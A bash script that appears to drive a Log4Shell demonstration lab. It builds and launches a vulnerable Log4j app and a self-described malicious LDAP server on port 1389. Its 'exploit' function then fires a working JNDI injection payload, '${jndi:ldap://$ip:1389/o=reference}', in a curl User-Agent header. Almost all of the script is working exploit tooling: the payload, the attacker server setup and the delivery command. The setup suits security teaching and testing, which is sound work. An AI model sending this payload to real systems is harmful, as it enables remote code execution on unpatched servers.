#!/usr/bin/env bash

function ci(){
  # check if the docker image exists - if not built it
  if [ $(docker images -a | grep -c ci-shell) != 1 ];then 
      docker build -t ci-shell .
  fi
  docker run --rm -it --name ci-shell ci-shell
}

function build(){
  mvn -f log4j-exploit/pom.xml clean compile assembly:single
  mvn -f  jndi-exploit/pom.xml clean compile assembly:single
}

function start(){
  nohup  java  -Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
        -jar log4j-exploit/target/log4j-exploit-1.0-SNAPSHOT-jar-with-dependencies.jar >> out.txt 2>&1 &
  echo -e "Log4j Vulnerable Apps Done"

  nohup  java  -jar jndi-exploit/target/jndi-exploit-1.0-SNAPSHOT-jar-with-dependencies.jar >> out.txt 2>&1 &
  echo -e "Malicious LDAP server for JNDI injection Attacks - Done"
}

function logs(){
  [ -f "out.txt" ] && tail -f out.txt
}

function stop(){
  pid="$(lsof -t -i:8080)"
  [ -n "$pid" ] && kill -9 "$pid"
  pid="$(lsof -t -i:1389)"
  [ -n "$pid" ] && kill -9 "$pid"
  clean
}

function clean(){
  rm -fr out.txt
}

function exploit(){
  ip="192.168.1.72"
  id=$(docker ps -a | grep jndi-exploit | awk '{print $1}')
  echo "jndi-exploit container is $id"
  if [ -n "$id" ];then
    ip=$(docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$id")
  fi
  ua="User-Agent: \${jndi:ldap://$ip:1389/o=reference}"
  curl -v -H "$ua" localhost:8080
}

function help(){
    echo "Usage: $0  {ci | build | start | logs | exploit | stop}" >&2
    echo
    echo "   ci         -> CI container "
    echo "   build      -> Build the source files "
    echo "   start      -> Start the Vulnerable App and Malicious JNDI Server  "
    echo "   logs       -> View Logs "
    echo "   exploit    -> Simulate Exploit"
    echo "   stop       -> Stop teh Apps"
    echo
    return 1
}

opt="$1"
choice=$( tr '[:upper:]' '[:lower:]' <<<"$opt" )
case $choice in
    ci) ci ;;
    build) build ;;
    start) start ;;
     logs)  logs ;;
    exploit)  exploit ;;
    stop) stop ;;
    *)  help ;;
esac


